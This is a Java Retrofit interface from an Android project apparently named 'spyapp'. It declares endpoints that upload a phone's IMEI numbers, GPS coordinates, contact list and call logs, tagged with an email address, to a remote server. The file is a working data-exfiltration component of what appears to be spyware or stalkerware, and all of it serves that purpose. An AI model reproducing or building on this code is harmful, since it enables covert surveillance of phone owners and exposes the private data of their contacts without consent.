package kkactive_india.in.spyapp;

import kkactive_india.in.spyapp.MainPOJO.MainBean;
import kkactive_india.in.spyapp.callLogPOJO.callsBean;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import kkactive_india.in.spyapp.locationPOJO.locationBean;
import kkactive_india.in.spyapp.mailPOJO.mailBean;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Headers;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

public interface Allapi {

    @Multipart
    @POST("mailApi.php")
    Call<mailBean> login (
            @Part("email") String m
    );

    @Multipart

    @POST("emiApi.php")
    Call<MainBean> main (
            @Part("email") String l,
            @Part("IMEI1") String m,
            @Part("IMEI2") String n
    );

    @Multipart
    @POST("lat_lon.php")
    Call<locationBean> latlon (
            @Part("email") String m,
            @Part("lat") String n,
            @Part("lon") String o
    );

/*    @Headers({"Content-Type: application/json"})
    @POST("great-cash/api/api.php")
    Call<contactBean> contact
            (
                    @Part("email") String m,
                    @Body contactBean body

            );*/


    @Multipart
    @POST("contact_log.php")
    Call<contactBean> contact (
            @Part("email") String m,
            @Part("contact") String n
    );

    @Multipart
    @POST("call_logs.php")
    Call<callsBean> calls (
            @Part("email") String m,
            @Part("call_log") String n
    );

}
